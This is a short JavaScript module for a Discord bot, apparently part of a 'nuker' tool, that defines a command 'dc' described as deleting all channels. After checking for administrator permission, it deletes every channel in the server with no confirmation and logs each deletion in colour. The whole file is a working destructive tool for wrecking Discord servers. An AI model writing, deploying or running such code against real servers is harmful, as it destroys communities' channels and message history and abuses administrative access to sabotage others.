const Discord = require('discord.js')
const chalk = require('chalk')

module.exports = {
    name: 'dc',
    description: 'deletes all channels',
    run: async(nuker, message, args) => {
        if(!message.guild.me.hasPermission("ADMINISTRATOR")) return console.log(chalk.grey('ERROR: MISSING ADMINISTRATOR PERMISSON!'))

        message.guild.channels.cache.forEach(ch => ch.delete().then(console.log(chalk.yellowBright("DELETED CHANNEL"))))
    }
}